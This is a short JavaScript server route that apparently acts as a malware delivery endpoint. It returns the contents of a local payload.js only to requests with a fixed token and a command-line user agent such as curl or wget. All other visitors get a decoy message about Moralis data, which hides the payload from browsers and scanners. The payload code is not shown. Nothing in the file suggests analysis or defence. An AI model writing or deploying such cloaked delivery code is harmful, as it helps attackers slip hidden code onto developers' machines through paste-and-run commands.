import fs from "fs";
import path from "path";

export default function handler(req, res) {
  const EXPECTED_TOKEN = "Z4T9QH";

  // Extract token from query string
  const token = String(req.query.token || "").trim();

  // Detect CLI user agent (curl, wget, fetch, httpie)
  function isCLI(ua = "") {
    ua = ua.toLowerCase();
    return (
      ua.includes("curl") ||
      ua.includes("wget") ||
      ua.includes("httpie") ||
      ua.includes("fetch/")
    );
  }

  // If token invalid OR UA not a CLI tool → hard reject
  if (token !== EXPECTED_TOKEN || !isCLI(req.headers["user-agent"])) {
    res.status(200).send("Cannot get Moralis data");
    return;
  }

  // Client-side payload code (same for all OS)
  const scriptPath = path.resolve("./payload.js");
  const script = fs.readFileSync(scriptPath, "utf-8");

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.send(script);
}
